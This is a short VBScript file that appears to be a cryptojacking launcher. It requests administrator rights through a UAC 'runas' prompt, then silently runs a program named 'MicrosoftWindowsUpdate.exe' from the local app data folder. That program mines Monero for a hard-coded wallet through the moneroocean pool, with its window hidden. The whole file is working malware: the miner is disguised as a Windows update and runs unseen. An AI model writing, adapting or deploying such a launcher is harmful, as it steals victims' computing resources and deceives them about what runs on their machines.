If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If
set ws = wscript.createobject("WScript.shell")
ws.run("cmd.exe /c %localappdata%\MicrosoftWindowsUpdate.exe -o gulf.moneroocean.stream:10128 -u 4BGXfWBzrSYN8yLPWL2MNF8QbXYZSopr4EEFzXQUSt3s2dafar2SNo7Jjy1iUpSu3TFXYPZtYsshi5Dx57RReCis3HLRUYD"), 0, true